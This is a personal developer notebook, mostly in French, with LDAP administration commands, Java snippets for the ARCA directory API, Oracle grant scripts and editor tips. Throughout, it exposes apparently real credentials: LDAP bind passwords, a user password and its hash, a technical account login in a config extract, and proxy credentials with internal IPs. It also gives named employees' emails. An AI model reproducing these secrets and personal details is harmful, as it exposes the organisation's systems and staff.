            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10389 -w hrsecret -x -b "ou=people, o=onp" "uid=*"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(&(objectclass=person)(x-osirh-Partenaire=MTS)(!(employeeType=ADMINISTRATEUR)))'
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -b "ou=people, o=onp"
            ldapsearch -D "cn=syncuser,ou=Management,o=onp" -h sac-as01 -p 10390 -x -b "ou=people, o=onp" -W
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(&(objectclass=person)(x-osirh-Partenaire=MCC)(!(employeeType=ADMINISTRATEUR)))'
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" '(&(objectclass=person)(!(employeeType=ADMINISTRATEUR)))'
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" "uid=*"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" -s sub "(pwdAccountLockedTime=*)" | grep ou=People
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" "uid=TITI2"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" "uid=OPA"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -x -b "ou=people, o=onp" "uid=*"
            ldapsearch -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -x -b "cn=syncuser,ou=Management,o=onp"
            ldapsearch -x -D "uid=FPEMCC000000274,ou=people,o=onp" \
                       -W -H(ou en minuscule plutot) ldap://sac-as02:10390 -b "ou=people,o=onp" \
                       -s sub 'uid=FPEMCC000000274'
            mot de passe : 8gXqkY
            mot de passe + sel : f9dc4fd38a29511278a9b0f12c87ccf5d1503b4fa46da4f11d37f821f1282f1a

            ajouter:
            ldapadd -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10389 -w hrsecret -x -f /tmp/sauv_ldap-gest_2016-06-09_21-01-40_MCH.ldif
            ldapadd -H ldap://sac-as02:10390 -x -D "cn=hruser,ou=Management,o=onp" -y ../scripts/.ldap_passwd -f pwdpolicy.ldif
            ldapadd -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -x -f /tmp/sauv_ldap-gest_2016-06-09_21-01-40_MCH.ldif

            supprimer:
            ldapdelete -D "cn=Manager, o=onp" -h sac-as01 -p 10389 -w secret -v "uid=FPEMCC000000272,ou=people,o=onp"
            ldapdelete -D "cn=Manager, o=onp" -h sac-as01 -p 10389 -w secret -v "uid=ADM000000050,ou=people,o=onp"
            ldapdelete -D "cn=hruser,ou=Management,o=onp" -h sac-as01 -p 10390 -w hrsecretself -v "ou=people,o=onp,uid=FPEMCC000000288"
            ldapdelete -D "cn=hruser,ou=Management,o=onp" -h sac-as02 -p 10390 -w hrsecretself -v "uid=TITI2,ou=people, o=onp"

            importer ldif:
            ldapmodify -h sac-as01 -p 10389 -D "cn=Manager, o=onp" -x -f /tmp/modentry.ldif -w secret
            ldapmodify -h sac-as02 -p 10390 -D "cn=Manager, o=onp" -x -f /tmp/modentryself.ldif -w secret
            ldapmodify -h sac-as02 -p 10390 -D "cn=Manager, o=onp" -x -f /tmp/modify_ou.ldif -w secret
            
            pour changer le policy: changer le delai expiration mot de passe:
                  >ldapdelete -h sac-as02 -p 10390 -D "cn=Manager,o=onp" -w $(sudo /exploit/scripts/pwd_lib_srv.ksh ldapself) "cn=default,ou=policies,o=onp"
                  > echo "dn: cn=default,ou=policies,o=onp
                  objectClass: top
                  objectClass: device
                  objectClass: pwdPolicy
                  cn: default
                  pwdAttribute: 2.5.4.35
                  pwdMaxAge: 60
                  pwdExpireWarning: 50
                  pwdInHistory: 8
                  pwdCheckQuality: 0
                  pwdMinLength: 8
                  pwdMaxFailure: 5
                  pwdLockout: TRUE
                  pwdLockoutDuration: 86400
                  pwdGraceAuthNLimit: 3
                  pwdFailureCountInterval: 0
                  pwdMustChange: TRUE
                  pwdReset: TRUE
                  pwdAllowUserChange: TRUE" > default.policies.onp.ldif
                  > ldapadd -h sac-as02 -p 10390 -D "cn=Manager,o=onp" -w $(sudo /exploit/scripts/pwd_lib_srv.ksh ldapself)  < default.policies.onp.ldif
          
          pour modifier le mot de passe d'un utilisateur
                  > ldappasswd -H ldap://sac-as02:10390/ -x -D "cn=Manager,o=onp" -w $(sudo /exploit/scripts/pwd_lib_srv.ksh ldapself) -a AncienPwdToto -s 'NouveauPwdToto123#azer' "uid=FPEDU1000000004,ou=people,o=onp"
                  -a ancien mot de passe   (non obligatoire si on utilise un Manager)
                  -s nouveau mot de passe

                          
      

ARCA :
pour recuperer la direction d'un utilisateur, et aussi sa fonction, son job:
                                ARCAUserSession arcaUserSession = arcaBean.getUserSession();
                              		ARCABasicService srv =arcaUserSession.getPersonManagementService();
                              		//	ARCABasicService srv =session.getPersonManagementService();
                              ARCABean arcaBean = (ARCABean) syeWebSession.getUserBean();
                                      Person rfoUser = (Person) arcaBean.getPerson();
                                      ARCAUserSession arcaUserSession = arcaBean.getUserSession();
                                      ARCABasicService srv =arcaUserSession.getPersonManagementService();
                                      HierarchicalReferentialUnitBrowser browser = srv.getHierarchicalReferentialUnitBrowser("renault-hr-organizations");
                              try{
                                  String direction = "UNKNOWN";
                                      List list1 = browser.getHierarchicalReferentialUnit(arcaUserSession.getUser(), ARCARelation.HIERARCHICAL_ATTACHMENT);
                                      ARCAAttributeName attributes[] =
                                      {
                                              ARCAAttributeName.ATT_RENJOB, // (utile pour le getHierarchicalReferentialUnitBrowser "renault-jobs" avec     ARCARelation.JOB_ATTACHMENT  important pour que la recherche avec les referentialUnit renvoient des listes remplies
                                              ARCAAttributeName.ATT_RENHRDOMAIN //(utile pour le getFlatReferentialUnitBrowser "renault-hr-domains" avec     ARCARelation.DOMAIN_ATTACHMENT   important pour que la recherche avec les referentialUnit renvoient des listes remplies
                                      };
                                      PersonFinder personFinder = srv.getPersonFinder();
                                      Person person = personFinder.getPersonByIPN(rfoUser.getIPN(), attributes);
                                      browser = srv.getHierarchicalReferentialUnitBrowser("renault-jobs");
                                      List list2 = browser.getHierarchicalReferentialUnit(person,    ARCARelation.JOB_ATTACHMENT );
                                      if (list1.size()!=0 && list2.size()!=0)
                                      {
                                          list1.addAll(0,list2);
                                      }
                                      else if (list1.size()==0)
                                      {
                                          list1= list2;
                                      }
                                      for (int i =0; i<list1.size(); i++)
                                      {
                                          ReferentialUnit charge = (ReferentialUnit)list1.get(i);
                                          if (charge.getName().toUpperCase().contains("ENGINEER") || charge.getName().toUpperCase().contains("INGENIE") )
                                              {
                                              direction = "INGENIERIE";
                                              break;
                                              }
                                          else if (charge.getName().toUpperCase().contains("FABRIC"))
                                          {
                                          direction = "FABRICATION";
                                          break;
                                          }
                                          else if (charge.getName().toUpperCase().contains("LOGISTI"))
                                          {
                                          direction = "LOGISTI";
                                          break;
                                          }
                                      }
                                      System.out.println(direction);
                              }
                              catch (Exception e)
                              {
                                  System.out.println(e);
                              }
                              


si j'ai le message Unable to initialize Struts ActionServlet due to an unexpected exception or error thrown, so marking the servlet as unavailable.  Most likely, this is due to an incorrect or missing library dependency.
                    javax.servlet.ServletException: Can't initialize ARCA configuration [message=null]:
                    c'est parce que le user defini dans arca n'est pas correct: 
                      			<ipn>AWTASG1</ipn>
			                         <password>r0077288</password>
pour connaitre la signification des attributs arca:
		demander à Djamel Malki : djamel.malki-renexter@renault.com il les connais tous bien
Recuperer ARCAUserSession de la session d’un compte technique (Batch et Web) en utilisant le fichier arca-config.xml (pour recuperer les mails avec un batch)
								ARCAContextManager arcamgr; n'en faire qu'un par appli!!!!
								arcamgr = new ARCAContextManager("C:\\projets_wsad5\\conf\\testApiARCA\\arca-config.xml");
								/* on retrouve mgr.session dans le fichier arca-config.xml */
								ARCAUserSession arcaSess = (ARCAUserSession) arcamgr.getAttribute("mgr.session");
								srv =session.getPersonManagementService();
                personFinder = srv.getPersonFinder();
								
								Extrait du fichier arca-config.xml associe :
											<context-attributes>
											<user-session attribute-name ="mgr.session">
											<ipn>awtxxxx</ipn>
											<password>xxx1234</password>
											</user-session>
											</context-attributes>

Recuperer ARCAUserSession de la session d’un compte technique (Batch et Web) sans utiliser le fichier arca-config.xml
										ARCAContextManager arcamgr;
										arcamgr = new ARCAContextManager("C:\\projets_wsad5\\conf\\testApiARCA\\arca-config.xml");
										/* user et psw sont des String correspondant au login du compte technique */
										BasicAuthenticationInfoSource authInfo = new BasicAuthenticationInfoSource(user, psw);
										ARCAUserSession session = (ARCAUserSession) = arcamgr.getAuthenticationManager().createUserSession(authInfo, PERSON_ATTRIBUTES);
										.
										Recuperer ARCAUserSession de la session de l’utilisateur connecte. (Web)
										
										A utiliser uniquement pour recuperer des informations concernant l’utilisateur connecte.
										ARCAContextManager arcamgr; n'en faire qu'un par appli!!!!
										arcamgr = new ARCAContextManager("C:\\projets_wsad5\\conf\\testApiARCA\\arca-config.xml");
										/* objet ARCAUserSession dependant de la session de l'utiliateur connecte*/
										 ARCAUserSession session = (ARCAUserSession) arcamgr.getAttribute("session");
										
										Ou 
										
										ARCAContextManager arcamgr; n'en faire qu'un par appli!!!!
										arcamgr = new ARCAContextManager("C:\\projets_wsad5\\conf\\testApiARCA\\arca-config.xml");
										/* req est un objet de type HttpServletRequest */
										HttpServletRequestAuthenticationInfoSource authInfo = new HttpServletRequestAuthenticationInfoSource(req); 
										ARCAUserSession session = (ARCAUserSession) = arcamgr.getAuthenticationManager().createUserSession(authInfo, PERSON_ATTRIBUTES);

pour connaitre la date d'expiration du mot de passe d'un utilisateur
			A partir d'un objet Person, il suffit d'appeler la methode getAccountInfo(). L'objet AccountInfo fournit ensuite un ensemble de methodes pour examiner les proprietes du compte, dont getPasswordExpirationDate().
Pour savoir si un utilisateur est fournisseur: 
				Person person = this.arcaBean.getUserSession().getBasicService().getPersonFinder().getPersonByIPN(ipn);
				if (person.getPersonSuperDomainID() ==  PersonSuperDomain.RENAULT_SUPPLIERS) 
l'expert arca: sebastien.sargologo@renault.com et maxime.gault-renexter@renault.com
pour avoir tous les utilisateurs qui correspondent à des critères definits: (appartenance a quel cost center etc etc)
			public Vector getPersonAttributeByName(
			       String personName,
			       ARCAAttributeName[] attributeName)
			       throws Exception {
			       try {
			           Vector response = null;
			           if (personName != null && personName.length() > 2) {
			               ARCASearchCriteria sc = new ARCASearchCriteria();
			               sc.add(
			                   new AttributeSC(
			                       ARCAAttributeName.ATT_CN, // ici je definit mes critères
			                       AttributeSC.OP_STARTS_WITH,
			                       personName));
			               sc.add(getPersonSuperDomainSC());
			               response = mgr.getArcaBean().getPersonList(sc, attributeName);
			               // ca ca me renvoit seulement ce qu'il y a dans mes attributs. Mais si je veux des ipn notemments: je dois faire ca: 
			               list = mgr.getArcaBean().getPersonFinder().getPerson(sc,attributeName);
			           }
			           return response;
			       } catch (ARCAException exc) {
			           Exception e = new Exception("ARCAException : " + exc);
			           throw e;
			       }
			   } 
	pour naviger a travers tous les objets arca: 
			public class Test {
				public static void main(String[] args) {
					try {
						ARCAContextManager context = new ARCAContextManager("C:\\projets_wsad5\\conf\\testApiARCA\\arca-config.xml");
						ARCAUserSession session = (ARCAUserSession) context.getAttribute("session");	
						ARCABasicService srv = session.getBasicService();
						HierarchicalReferentialUnitBrowser browser = srv.getHierarchicalReferentialUnitBrowser("renault-hr-organizations");
						ReferentialUnitReader reader = session.getReferentialUnitReader("renault-hr-organizations");
						HierarchicalReferentialUnit root = browser.getRoot();
						System.out.println(reader.getStringAttributeOf(root, ARCAAttributeName.ATT_RENCOSTCENTER));
						listChildrenOf(browser, reader, root);
						
						System.out.println("success");
						context.destroy();
					} catch (ARCAException e) {
						e.printStackTrace();
					}
				}
				private static void listChildrenOf(HierarchicalReferentialUnitBrowser browser, ReferentialUnitReader reader,HierarchicalReferentialUnit parent)	throws ARCAException 
        {
					List children = browser.getChildrenOf(parent);
					Iterator iter = children.iterator();
					HierarchicalReferentialUnit child;
					while(iter.hasNext()) {
						child = (HierarchicalReferentialUnit) iter.next();
						System.out.println(reader.getStringAttributeOf(child, ARCAAttributeName.ATT_RENCOSTCENTER));
						listChildrenOf(browser, reader, child);
					}
				}
			}
	pour recuperer les rattachement administratifs d'un utilisateur fournisseur (en considerant qu'on a un objet ARCAUserSession qui s'appelle session) :
					String referential = "renault-suppliers-organizations";
						HierarchicalReferentialUnitBrowser browser = session.getPersonManagementService().getHierarchicalReferentialUnitBrowser(referential);
						// Relation au choix : rattachement direct (partiel) ou complet
						//List list = browser.getHierarchicalReferentialUnit(session.getUser(), ARCARelation.DIRECT_ADMINISTRATIVE_ATTACHMENT);
						List list = browser.getHierarchicalReferentialUnit(session.getUser(), ARCARelation.ADMINISTRATIVE_ATTACHMENT);
						HierarchicalReferentialUnit unit = null;
						for(int i = 0; i < list.size(); i++) {
						    unit = (HierarchicalReferentialUnit)list.get(i);
						    System.err.println("Unit name = " + unit.getDisplayName() + ", ID = " + unit.getId() + ", type = " + unit.getType());
						}
						Exemple avec le user fp04263 (dispo en dev avec son ipn comme mdp si besoin) :
						// le complet vous renverra toute la hierarchie de rattachement, vous obtiendrez :
						Unit name = VALEO VISION SAS, ID = entt0000000458, type = ENTT
						Unit name = VALEO     BLOIS, ID = site00045811, type = SITE
						Unit name = VALEO, ID = sagavaleo, type = GROUP
						// le direct vous renverra l'attachement de plus bas niveau, vous obtiendrez :
						Unit name = VALEO     BLOIS, ID = site00045811, type = SITE
							Par contre vous êtes bel et bien obliges de faire un substring sur l'ID, l'annuaire ne contenant pas l'ID seul dans un attribut.
		pour recuperer une application
										private Application returnApplication(ARCAUserSession arcaSession)
												throws ARCASystemException, ARCADirectoryException {
												ARCAAttributeName[] nom = new ARCAAttributeName[1];
												nom[0]= ARCAAttributeName.ATT_RENSIA;
												ApplicationFinder finder = arcaSession.getApplicationManagementService().getApplicationFinder();
												ARCAIdentifier arcaid = new ARCAIdentifier(Constants.MAP_RENSIA); // "cn=GEA, ou=Applications, ou=FRA, ou=Rights, o=renault"
												Application map = finder.getApplication(arcaid, nom);
												return map;
											}
		 pour recuperer les roles arca d'un utilisateur: 
		 				ARCAContextManager arcamgr;
		 				ARCAUserSession arcaSession = arcamgr.getAuthenticationManager().createUserSession(authInfo, PERSON_ATTRIBUTES);
		 				//recuperation de l'application MAP:
						Application map = returnApplication(arcaSession);
						// recuperation des roles de l'utilisateur
						Role[] roles = arcaSession.getApplicationUserProfile(map).getUserRoles();
						//renvoit du premier role rencontre		
						if (roles.length >0) user.setRights(roles[0].getName());

pour modifier les roles arca d'un utilisateur: 
sert aussi à recuperer tous les roles d'une application donnee:
			try{
			
			ARCAUserSession arcaSession = (ARCAUserSession)ARCABean.getMgr().getAttribute("mgr.session"); // create admin session
			Application map = returnApplication(arcaSession); // get the application
			Person person1 = arcaSession.getBasicService().getPersonFinder().getPersonByIPN("awaprad"); // get the person we are interested in modifying his roles
			Role rolesUser[] = arcaSession.getApplicationUserProfile(map, person1).getUserRoles(); // get the roles of this person in this application
			RoleManager rm  = arcaSession.getApplicationManagementService().getRoleManager(); // create a roleManager object
			ARCABasicService srv = arcaSession.getBasicService(); // get a basic service
			srv.getRoleLoader().loadAllRoles(map); // load all roles for this application
			List<Role> roleApplication = map.getLoadedRoles(); // after loading have the list of roles for this application
			Set<Person> memberset = new HashSet<Person>() ;
			memberset.add(person1);
			// create a role for a user :
			if (roleApplication.get(0)!=null)
			{
				rm.addMembers(roleApplication.get(0), memberset);
			}
		
			// remove a role for a user:
			if (roleApplication.get(0)!=null)
			{
				rm.removeMembers(roleApplication.get(0), memberset);
			}
			}
			catch(Exception e)
			{
				StringWriter sw = new StringWriter();
		        PrintWriter pw = new PrintWriter(sw, true);
		        e.printStackTrace(pw);
		        pw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
		        sw.flush();
		        System.out.println(sw.toString());
			}
					
			
						
					attention, dans arcaconfig.xml il doit y avoir ca: 
							        </application>
									         <user-session attribute-name ="mgr.session">
												<ipn>awtxxxx</ipn>
												<password>xxx1234</password>
												</user-session>
									    </context-attributes>

		pour recuperer les DNs des personnes rattachees administrativement ou structurellement au critère saisi:
			    public List doSearch(List res, SearchAndResultSubContext subContext, ADPProfile profile) throws ADPException {
			        List ret = new ArrayList();
			        try {
			            // On recupère la valeur saisie par l'utilisateur qui va servir de base à la recherche
			            HierarchicalReferentialUnit baseUnit = (HierarchicalReferentialUnit)getElementValue(subContext, profile);
			           
			            if(baseUnit != null) {   
			                // Objets necessaires
			                ARCAUserSession session = profile.getArcaSession();
			                ARCAPersonManagementService service = session.getPersonManagementService();
			                //ARCABasicService service = session.getBasicService();
			                PersonFinder personFinder = service.getPersonFinder();
			                ARCASearchCriteria searchCriteria = new ARCASearchCriteria();
			                HierarchicalReferentialUnitBrowser browser = service.getHierarchicalReferentialUnitBrowser(referential);
			               
			                // Recherche "habituelle" sur le rattachement administratif
			                searchCriteria.add(new RelationSC(baseUnit, ARCARelation.ADMINISTRATIVE_ATTACHMENT));
			                searchCriteria.add(new PersonSuperDomainSC(subContext.getSelectedSuperDomain()));
			                List personList = personFinder.getPerson(searchCriteria, MEMBER_ATTRIBUTES);
			               
			                /*
			                 * On teste l'existence d'un parent. Si il n'y a pas de parent, on arrête la recherche :
			                 * - si la base est un groupe : les rattachements fonctionnels et administratifs sont forcement sur ce même groupe !
			                 * - si la base est une entite sans groupe : les rattachements fonctionnels et administratifs sont forcement sur cette même entite !
			                 */
			                HierarchicalReferentialUnit parentUnit = browser.getParentOf(baseUnit);
			                if(parentUnit != null) {
			                    List secondPersonList = new ArrayList();
			                    List bufferPersonList = new ArrayList();
			                    HierarchicalReferentialUnit rootUnit = null;
			                    HierarchicalReferentialUnit bufferUnit = browser.getParentOf(parentUnit);
			                    // On recupère la racine de recherche : un groupe ou un entite
			                    rootUnit = (bufferUnit == null) ? parentUnit : bufferUnit;
			                   
			                    List baseChildrenUnits = browser.getChildrenOf(baseUnit);
			                    // Tester les enfants permet de savoir si la base est une entite ou un site
			                    if(baseChildrenUnits.size() != 0) {
			                        HierarchicalReferentialUnit currentChildUnit = null;
			                        // Cas où la base de recherche est une entite : on va boucler sur ses enfants, des sites
			                        Iterator iter = baseChildrenUnits.iterator();
			                        while(iter.hasNext()) {
			                            currentChildUnit = (HierarchicalReferentialUnit)iter.next();
			                            searchCriteria = new ARCASearchCriteria();
			                            searchCriteria.add(new RelationSC(rootUnit, ARCARelation.ADMINISTRATIVE_ATTACHMENT));
			                            searchCriteria.add(new RelationSC(currentChildUnit, ARCARelation.FUNCTIONAL_ATTACHMENT));
			                            secondPersonList = personFinder.getPerson(searchCriteria, MEMBER_ATTRIBUTES);
			                            bufferPersonList.addAll(secondPersonList);
			                        }
			                        // Debut LOT07_OD5135 Maxime Gault 17/12/2007 : correction FA009_lot7
			                        // personList.addAll(bufferPersonList);
			                        if((personList.size() == 0) && (bufferPersonList.size() == 0)) {
			                            return null;
			                        }
			                        else if(personList.size() == 0) {
			                            personList = secondPersonList;
			                        }
			                        else {
			                            personList.addAll(bufferPersonList);
			                        }
			                        // Fin LOT07_OD5135 Maxime Gault 17/12/2007
			                        personList = removeDuplicates(personList);
			                    }
			                    else {
			                        /*
			                         * Cas où la base de recherche est un site, on combine :
			                         * - rattachement administratif sur la racine (entite ou groupe)
			                         * - rattachement fonctionnel sur le site
			                         */
			                        searchCriteria = new ARCASearchCriteria();
			                        searchCriteria.add(new RelationSC(rootUnit, ARCARelation.ADMINISTRATIVE_ATTACHMENT));
			                        searchCriteria.add(new RelationSC(baseUnit, ARCARelation.FUNCTIONAL_ATTACHMENT));
			                        secondPersonList = personFinder.getPerson(searchCriteria, MEMBER_ATTRIBUTES);
			                       
			                        // Debut LOT07_OD5135 Maxime Gault 17/12/2007 : correction FA009_lot7
			                        //personList.addAll(secondPersonList);
			                        //personList = removeDuplicates(personList);
			                        if((personList.size() == 0) && (secondPersonList.size() == 0)) {
			                            return null;
			                        }
			                        else if(personList.size() == 0) {
			                            personList = secondPersonList;
			                        }
			                        else {
			                            personList.addAll(secondPersonList);
			                        }
			                        // Fin LOT07_OD5135 Maxime Gault 17/12/2007
			                        personList = removeDuplicates(personList);
			                    }
			                }
			                //PersonReader persReader = session.getPersonReader();
			                //Collections.sort(personList, persReader.getComparator());
			                ret = extractPersonsDN(personList);
			                return ret;
			            }           
			            return null;   
			        }
			        catch (ARCAException e) {
			            e.printStackTrace();
			        }
			        return null;
			    }
pour recuperer le mail d'un utilisateur (voir la classe ARCA.java de adu)
        	    public static final ARCAAttributeName attributes[] = {
                  		ARCAAttributeName.ATT_GIVENNAME,
                  		ARCAAttributeName.ATT_CN,
                  		ARCAAttributeName.ATT_OU,
                  		ARCAAttributeName.ATT_MAIL,
                  		ARCAAttributeName.ATT_TELEPHONENUMBER,
                  		ARCAAttributeName.ATT_DEPARTMENTNUMBER,
                  		ARCAAttributeName.ATT_POSTOFFICEBOX
                  	};
              value = arca.getPersonReader().getStringAttributeOf(person, att);
                protected static String getValue(ARCABean arca, Person person, ARCAAttributeName att) {
                                        	String value = "";
                                    
                                        	try {
                                    		    value = arca.getPersonReader().getStringAttributeOf(person, att);
                                        	} catch (Exception e) {
                                        	}
                                    
                                        	return value;
                  public static String getMail(ARCABean arca, Person person)
                  {
                                	return getValue(arca, person, attributes[3]);
                                }    
Ou encore comme ca pour recuperer le mail d'un utilisateur dans arca dans une application web avec mgr.getarcabean
                      public static String getMailByIpn(SessionDataManager mgr, String nomPrenom) throws Exception{
                      		String mail = null;
                      		try
                      		{
                      		if (mgr.getArcaBean() != null && nomPrenom != null) 
                      		{
                      			ARCAUserSession arcaUserSession = mgr.getArcaBean().getUserSession();
                      	  		ARCABasicService srv =arcaUserSession.getPersonManagementService();
                      	  		PersonFinder personFinder = srv.getPersonFinder();
                      	  		
                      			java.util.Vector personList = new java.util.Vector();
                      					java.util.List list = null;
                      					
                      						
                      						ARCAAttributeName[] personAttributes =
                      							{
                      								ARCAAttributeName.ATT_EMPLOYEENUMBER,
                      								ARCAAttributeName.ATT_CN,
                      								ARCAAttributeName.ATT_MAIL};
                      						Person person = personFinder.getPersonByIPN(nomPrenom, personAttributes);
                      						mail = mgr.getArcaBean().getPersonReader().getStringAttributeOf(person, ARCAAttributeName.ATT_MAIL);
                      //						ARCASearchCriteria sc = new ARCASearchCriteria();
                      //						sc.add( new AttributeSC(new ARCAAttributeName("cn"), AttributeSC.OP_CONTAINS,nomPrenom));
                      //						list = mgr.getArcaBean().getPersonFinder().getPerson(sc,personAttributes);
                      //						personList = mgr.getArcaBean().getPersonList(sc, personAttributes);
                      //						java.util.Hashtable person = (java.util.Hashtable)personList.elementAt(0);
                      //						
                      //						
                      //						return person.get(ARCAAttributeName.ATT_MAIL).toString();
                      		}
                      		}
                      		catch (Exception e)
                      		{
                      			throw e;
                      		}
                      					return mail;
                      	}


        	    
			pour recuperer les rattachements fonctionnels d'un IPN donne, toujours à partir de l'objet ARCAUserSession session :
						ARCAPersonManagementService service = session.getPersonManagementService();
						PersonFinder personFinder = service.getPersonFinder();
						// Il faut recuperer la personne en premier lieu via une recherche à part
						Person person = personFinder.getPersonByIPN("fp15768", new ARCAAttributeName[] {new ARCAAttributeName("renfunctionalattachment")});
						// Ensuite recuperer les units de la même façon que dans mon precedent mail mais à partir de cette personne
						String referential = "renault-suppliers-organizations";
						HierarchicalReferentialUnitBrowser browser = session.getPersonManagementService().getHierarchicalReferentialUnitBrowser(referential);
						List list = browser.getHierarchicalReferentialUnit(person, ARCARelation.FUNCTIONAL_ATTACHMENT);
pour avoir touts les objets person à partir d'une liste d'ipn: 
		ARCAContextManager arcamgr = new ARCAContextManager("arca-config.xml");
		ARCAUserSession session = (ARCAUserSession) arcamgr.getAttribute("mgr.session");
		PersonFinder personFinder = session.getBasicService().getPersonFinder();
         List response = null;
        Set  sc = new HashSet() ;
		int i=0;
		for (Action action : actions)
		{
			if (action.getIpn()!=null && !action.getIpn().equals(""))
			{
		               sc.add(action.getIpn());
			}
			i++;
       }
	    try {
			response = personFinder.getPersonByIPNSet(sc);
			Iterator<Person> iter = response.iterator();
			while(iter.hasNext()) 
			{
				Person p = iter.next();
				String displayName = p.getDisplayName();
				String ipn = p.getIPN();
				for (Action action : actions)
				{
					if (action.getIpn().equals(ipn))
					{
						action.setUserName(displayName);
					}
				}
			}
		} catch (ARCASystemException e) {
			throw new Exception(e);
		} catch (ARCADirectoryException e) {
			throw new Exception(e);
		}
		return actions;
		} 



Mon espace de travail: 
\\f-mehen-md\home5$\p036782\MyDocs\IBM\wsappdev51\workspace



-----------------------------------------------------------------
Appel a d'autres variables dans un script unix:
aussi pour donner des droits sur un utilisateur oracle: 
Par exemple le script : grant_r.sql est de la forme :
    su255ars:/rdcre701/rdc/livraison/V02.01.00/db/RDC --> head grant_r.sql
    START _environnement.sql
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0001_COMITE TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0002_ELE_TRAITE_PAR_COM TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0003_TERME_ELEMENT_RDC TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0004_TYPE_ELEMENT TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0005_ELE_CONTIENT TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0006_ARBRE_ELEMENT TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0007_STATUT_ARBO TO &user_r;
    GRANT DELETE, INSERT, SELECT, UPDATE, REFERENCES ON TB0008_LIBARBREELEAPOURTRAD TO &user_r;
    su255ars:/rdcre701/rdc/livraison/V02.01.00/db/RDC -->

Il fait appel à  un script d'initialisation :

    su255ars:/rdcre701/rdc/livraison/V02.01.00/db/RDC --> cat _environnement.sql
    DEFINE schema_adm=RDC_ADM.
    DEFINE user_rw=RDC_RW
    DEFINE user_r=RDC_R
    DEFINE tb_d1=RDC_D1
    DEFINE tb_i1=RDC_I1
Oà¹ sont definis les variables
-----------------------------------------------------------------



pour faire marcher php avec oracle: (wamp) il faut que j'utilise l'utilitaire de wamp pour activer les extensions dll et decommenter aussi les lignes dans php.ini( deux lignes.. ora et oci un truc comme ca)
ORACLE_HOME 
D_LIBRARY_PATH 
definir aussi ces paths dans les variables d'environnement
-----------------
PEAR :
pear config-show permet de voir la configuration de pear
pour se connecter derriere un proxy: pear config-set http_proxy http://p036782:rcwkdr2@172.26.80.141:3128
pear config-set http_proxy http://p036782:rcwkdr2@138.21.88.65:3128
pear config-set http_proxy http://p036782:rcwkdr2@172.26.80.140:3128

CLA OP-OC
\\F-mehen\data6\p-d3k_ph1\D3K_Phase1\D3K_AO\07. Projet OP\7.1. Documents AtosOrigin\7.1.3. CLA 
_____________________________________
La commande utilisee pour creer les fichiers ISO sous unix est:
mkisofs -J -r -o $FILE_OUT $FILE_IN
mkisofs -r -o CD-CS-1.iso CD-CS-1
mkisofs -J -r -o CD-CS-1.iso CD-CS-1
l'option -J autorise l'extension Joliet qui conserve les noms des fichiers

les fichiers btr ancien formats: 
J:\1_RENAULT_DONT_DELETE\BTR\BTR_ancien_format
nouveau format fre002
J:\1_RENAULT_DONT_DELETE\BTR\BTR_FRE002

taille dvd: 4go



autosys : mieux que crontab
pour l'utiliser il faut d'abord definir $DISPLAY sur ma machine sinon ca va s'afficher n'importe ou: echo $DISPLAY doit renvoyer mon ip
lancer autosys avec la commande autosc
definition: une box contient plusieurs jobs
un job a des conditions d'execution et c'est une commande unix.


quand Surekha import un excell NUMERO_PROJET elle a ce warning Unknown Ptg 3d (61) qui est enleve quand on copy paste que les values dans un nouveau document


ultraedit :
recherche en avant: F3 recherche arriere: Ctrl+F3
expression reguliere retour chariot: ^p ou ^n ou ^r
expression reguliere tabulation: ^t
expression reguliere pas le caractère "xyz": [^xyz] Un ensemble "negatif" de caractères. Correspond à n'importe quel caractère excepte ceux entre crochets
expression reguliere echap: pour trouver "[" tapper ^[ car ^Desactive le prochain caractère des expressions regulières 
expression reguliere AouBpuisCouD:^{A^}^{B^} ^{C^}^{D^}
Ctrl+B pour cherche une parenthese ou acollade ou crochet correspondant
Pour faire des modifs en hexadecimal:
Toutes les modifications sont faites dans le mode ECRASEMENT.  Pour inserer ou effacer des caractères dans le mode Hexa, utilisez l'element Insertion/Effacement Hexa du menu Edition.
   hexa:xx = 1 octet xxxxxxxx
   site de conversion hexa<->decimal 
        http://www.statman.info/conversions/hexadecimal.html


PSPAD :
backups : back : menu >parametres>parametres du programme>sauvegarde
pour selectionner en mode colonne (sans cliquer sur l'icone qui des fois ne marche pas)
    alt + selection avec souris. refaire une selection sans alt revient à l'état normal de selection
pour passer la selection en majuscule minuscule
    Ctrl+alt+u  ou l                                  
HExEditor hexadecimal: 
  Ctrl+MouseWeel permet de changer le nombre de byte par colomne
pour supprimer les lignes vides empty lines retour chariot uniquement
  edit>lines manipulation>Delete blank line
Ctrl+m pour cherche une parenthese ou acollade ou crochet correspondant
